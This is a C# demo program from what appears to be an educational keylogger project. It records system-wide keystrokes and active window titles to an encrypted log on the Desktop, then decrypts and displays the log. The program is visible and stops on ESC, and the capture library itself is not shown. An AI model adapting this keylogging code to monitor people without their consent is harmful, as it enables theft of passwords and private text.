using System;
using System.IO;
using System.Threading;
using Keylogger.Core.InputMonitoring;
using Keylogger.Core.WindowTracking;
using Keylogger.Core.Encryption;

namespace Keylogger.Samples.BasicKeylogger
{
    /// <summary>
    /// A basic demonstration of how to use the keylogger components
    /// For educational purposes only
    /// </summary>
    class BasicDemo
    {
        static void Main(string[] args)
        {
            Console.WriteLine("==================================");
            Console.WriteLine("Basic Keylogger Demo - Educational");
            Console.WriteLine("==================================");
            Console.WriteLine();
            Console.WriteLine("This demo shows how to use the keylogger components for educational purposes.");
            Console.WriteLine("Press ESC at any time to exit the demo.");
            Console.WriteLine();
            
            // Create log file path
            string logPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                "keylogger_demo.txt");
                
            Console.WriteLine($"Logging to: {logPath}");
            Console.WriteLine();
            
            // Initialize components
            var encryptionService = new EncryptionService("demo-encryption-key");
            var keyboardMonitor = new KeyboardMonitor();
            var windowTracker = new ActiveWindowTracker();
            
            // Set up log file
            using (StreamWriter sw = File.CreateText(logPath))
            {
                sw.WriteLine(encryptionService.Encrypt($"=== Demo Started: {DateTime.Now} ==="));
            }
            
            // Subscribe to events
            keyboardMonitor.KeyPressed += (sender, e) => 
            {
                // Log key press
                string keyData = e.KeyText;
                Console.Write(keyData); // Show in console
                
                // Write to file
                try
                {
                    using (StreamWriter sw = File.AppendText(logPath))
                    {
                        sw.Write(encryptionService.Encrypt(keyData));
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"\r\nError writing to log: {ex.Message}\r\n");
                }
            };
            
            windowTracker.WindowChanged += (sender, e) => 
            {
                // Log window change
                string windowData = $"\r\n[Window changed: {e.NewWindowTitle} at {e.Timestamp.ToLongTimeString()}]\r\n";
                Console.Write(windowData); // Show in console
                
                // Write to file
                try
                {
                    using (StreamWriter sw = File.AppendText(logPath))
                    {
                        sw.Write(encryptionService.Encrypt(windowData));
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"\r\nError writing to log: {ex.Message}\r\n");
                }
            };
            
            // Start monitoring
            windowTracker.Start();
            keyboardMonitor.Start();
            
            Console.WriteLine("Monitoring started. Press ESC to stop...");
            
            // Run until user presses ESC
            while (true)
            {
                if (Console.KeyAvailable)
                {
                    var key = Console.ReadKey(true);
                    if (key.Key == ConsoleKey.Escape)
                        break;
                }
                Thread.Sleep(10);
            }
            
            // Clean up
            keyboardMonitor.Stop();
            windowTracker.Stop();
            
            Console.WriteLine("\r\nDemo stopped. Press any key to decrypt and view the log...");
            Console.ReadKey(true);
            
            // Display decrypted log
            Console.WriteLine("\r\n=== Decrypted Log Contents ===\r\n");
            
            try
            {
                string[] lines = File.ReadAllLines(logPath);
                foreach (string line in lines)
                {
                    try
                    {
                        Console.Write(encryptionService.Decrypt(line));
                    }
                    catch
                    {
                        Console.WriteLine("[Could not decrypt line]");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading log: {ex.Message}");
            }
            
            Console.WriteLine("\r\n\r\nDemo complete. Press any key to exit...");
            Console.ReadKey(true);
        }
    }
}